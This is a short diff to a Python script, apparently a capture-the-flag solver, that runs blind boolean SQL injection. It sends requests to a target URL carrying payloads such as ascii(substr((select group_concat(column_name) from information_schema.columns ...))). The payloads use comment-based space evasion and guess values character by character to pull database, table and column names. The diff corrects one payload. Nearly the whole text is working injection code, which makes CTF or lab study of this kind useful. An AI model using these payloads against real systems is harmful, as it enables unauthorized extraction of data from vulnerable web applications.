@@ -8,7 +8,7 @@ for num1 in range(1,8):
     for num2 in range (20,180):
         # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         # data = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
-        data = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/column_schema="flag")/**/from/**/%d/**/for/**/1))=%d' % (num1, num2)
+        data = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/column_name="flag")/**/from/**/%d/**/for/**/1))=%d' % (num1, num2)
         result = requests.get(url + data,verify=False)
         if "If" in result.text:
             word+=chr(num2)
